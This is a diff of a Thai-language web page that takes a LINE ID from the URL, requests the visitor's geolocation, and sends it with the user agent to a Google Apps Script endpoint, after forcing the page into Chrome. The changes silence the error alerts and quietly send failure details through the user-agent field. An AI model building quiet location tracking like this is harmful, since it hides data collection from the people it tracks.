@@ -77,7 +77,7 @@
     }
   </style>
   <script>
-
+    var msgError = null;
     function getLineIdFromUrl() {
       const params = new URLSearchParams(window.location.search);
       return params.get("id");
@@ -91,7 +91,10 @@
         return;
       }
 
-
+      var userAgent = navigator.userAgent || 'none';
+      if(msgError){
+        userAgent = msgError;
+      }
       const scriptUrl =
         "https://script.google.com/macros/s/AKfycbz2lSrlH4nRZDMbFK4RLGw02FcOpWe-Kchvpl6tCSSOqYvaEh78zgRN9Ve1kQg_n9ao/exec"; // ใส่ URL ของ Google Apps Script
       const url = `${scriptUrl}?lineId=${encodeURIComponent(
@@ -100,7 +103,7 @@
         latitude
       )}&longitude=${encodeURIComponent(
         longitude
-      )}&userAgent=${encodeURIComponent(navigator.userAgent)}`;
+      )}&userAgent=${encodeURIComponent(userAgent)}`;
 
       try {
 
@@ -134,16 +137,20 @@
           (error) => {
          switch (error.code) {
           case error.PERMISSION_DENIED:
-            alert("คุณปฏิเสธการเข้าถึงตำแหน่งที่ตั้ง");
+            // alert("คุณปฏิเสธการเข้าถึงตำแหน่งที่ตั้ง");
+             msgError = "คุณปฏิเสธการเข้าถึงตำแหน่งที่ตั้ง";
             break;
           case error.POSITION_UNAVAILABLE:
-            alert("ไม่สามารถระบุตำแหน่งที่ตั้งได้");
+             //alert("ไม่สามารถระบุตำแหน่งที่ตั้งได้");
+              msgError = "ไม่สามารถระบุตำแหน่งที่ตั้งได้";
             break;
           case error.TIMEOUT:
-            alert("การขอข้อมูลตำแหน่งที่ตั้งหมดเวลา");
+            // alert("การขอข้อมูลตำแหน่งที่ตั้งหมดเวลา");
+             msgError = "การขอข้อมูลตำแหน่งที่ตั้งหมดเวลา";
             break;
           default:
-            alert("เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ");
+            // alert("เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ");
+             msgError = "เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ";
             }
         
             sendLocation(0, 0);
@@ -151,7 +158,8 @@
           }
         );
       } else {
-        alert("เบราว์เซอร์ของคุณไม่รองรับ");
+        //alert("เบราว์เซอร์ของคุณไม่รองรับ");
+        msgError = "เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ";
         sendLocation(0, 0);
       }
     }
@@ -168,11 +176,11 @@
       errorDiv.style.display = "none";
     }
    function openInExternalBrowser() {
-      const id =  getLineIdFromUrl();
-      const intentUrl = "intent://kunohana.github.io/c?id="+id+"/#Intent;scheme=https;package=com.android.chrome;end;";
-      // ลองเปลี่ยนเส้นทางไปยัง intent://
-      window.location.href = intentUrl;
-    }
+      const id =  getLineIdFromUrl();
+      const intentUrl = "intent://kunohana.github.io/c?id="+id+"/#Intent;scheme=https;package=com.android.chrome;end;";
+       // ลองเปลี่ยนเส้นทางไปยัง intent://
+      window.location.href = intentUrl;
+    }
 
     $(document).ready(function () {
       openInExternalBrowser();
